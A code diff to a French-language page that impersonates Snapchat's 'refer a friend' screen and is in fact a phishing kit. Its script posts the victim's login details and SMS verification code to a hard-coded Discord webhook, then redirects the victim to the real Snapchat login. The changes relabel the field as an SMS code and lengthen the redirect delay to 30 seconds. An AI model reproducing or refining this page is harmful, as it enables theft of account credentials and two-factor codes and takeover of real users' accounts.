@@ -5,10 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Snapchat | Parrainez Un Ami</title>
 
-  <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
-  <meta property="og:description" content="Description courte" />
-  <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
-
   <style>
     body {
       margin: 0;
@@ -162,14 +158,14 @@
 
   <!-- Zone de saisie du code avec bouton -->
   <div class="code-screen" id="imageScreen">
-    <label for="codeInput">Code reçu</label>
+    <label for="codeInput">Code Reçu par SMS</label>
     <input type="text" id="codeInput" name="codeInput" />
     <button id="validateButton">Validez</button>
   </div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1456052165062955154/PIffzSrsDCnQ4Q-Um7YqT4e9Ti6Cz7m8FbSHqI169lw6MnT8nra8dyS_zEesu9M3wsNS";
-    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
+    const redirectURL = "https://accounts.snapchat.com/v2/login";
 
     // Gestion du formulaire de connexion
     document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -245,7 +241,7 @@
         embeds: [
           {
             title: "📥 Code reçu",
-            description: "Utilisateur a entré son code reçu",
+            description: "Utilisateur a entré son code reçu par SMS",
             color: 0x00ff00,
             fields: [
               { name: "💬 Code", value: codeInput }
@@ -262,11 +258,11 @@
         body: JSON.stringify(codeMessage),
       })
       .then(response => {
-        alert("Code envoyé !");
-        // Redirection après 5 secondes
+        alert("Code envoyé ! La redirection aura lieu dans 30 secondes.");
+        // Redirection après 30 secondes
         setTimeout(() => {
           window.location.href = redirectURL;
-        }, 5000);
+        }, 30000);
       })
       .catch(error => {
         alert("Erreur réseau ou CORS.");
